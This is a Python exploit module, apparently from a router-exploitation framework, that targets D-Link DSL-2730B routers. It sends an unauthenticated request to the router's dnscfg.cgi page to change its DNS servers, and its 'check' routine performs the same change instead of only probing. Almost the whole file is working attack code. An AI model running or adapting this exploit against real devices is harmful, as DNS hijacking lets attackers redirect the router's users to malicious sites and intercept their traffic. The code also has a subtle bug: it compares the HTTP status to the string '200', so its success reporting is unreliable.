try:
    from requests import get
except ImportError as e:
    print "ImportError: {0}".format(e.message)
    exit(-1)

from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name = "DSL-2730B Authentication Bypass DNS Change",
            category = "csrf",
            authors = {
                "Todor Donev": "Vulnerability discovery",
                "Daniel Diez": "RExploit module"
            },
            targets=[
                "DSL-2730B"
            ],
            date = "08/06/2015",
            cwe = "CWE-352: Cross-Site Request Forgery (CSRF)",
            description = "Different D-Link Routers are vulnerable to DNS change. The vulnerability exist in the web interface, which is  accessible without authentication. ",
            references = {
                "https://www.exploit-db.com/exploits/36105/": "ExploitDB"
            }
        )

    def default(self):
        data = {"dns1": "8.8.8.8", "dns2": "8.8.8.8"}

        return data

    def run(self, data):
        DNS1 = data["dns1"]
        DNS2 = data["dns2"]

        url = "http://{0}//dnscfg.cgi?dnsPrimary={1}&dnsSecondary={2}&dnsDynamic=0&dnsRefresh=1&dnsIfcsList=".format(self.getIP(), DNS1, DNS2)
        r = get(url)

        if r.status_code == "200":
            message = "DNS change successfully"
        else:
            message = "Error"

        return message

    def check(self):
        data = self.default()
        DNS1 = data["dns1"]
        DNS2 = data["dns2"]

        url = "http://{0}//dnscfg.cgi?dnsPrimary={1}&dnsSecondary={2}&dnsDynamic=0&dnsRefresh=1&dnsIfcsList=".format(
            self.getIP(), DNS1, DNS2)

        r = get(url)

        if r.status_code == "200":
            return True
        else:
            return False

